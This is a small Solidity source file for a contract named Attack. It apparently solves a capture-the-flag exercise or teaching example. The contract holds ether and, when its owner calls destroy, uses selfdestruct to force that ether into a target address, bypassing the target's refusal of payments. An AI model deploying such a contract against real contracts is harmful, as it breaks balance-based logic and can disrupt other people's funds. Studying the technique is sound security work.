// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address private owner; 

    constructor() {
        owner = msg.sender; 
    }
    
    function destroy(address payable addr) public payable{
        require(msg.sender == owner);
        selfdestruct(addr);
    }
}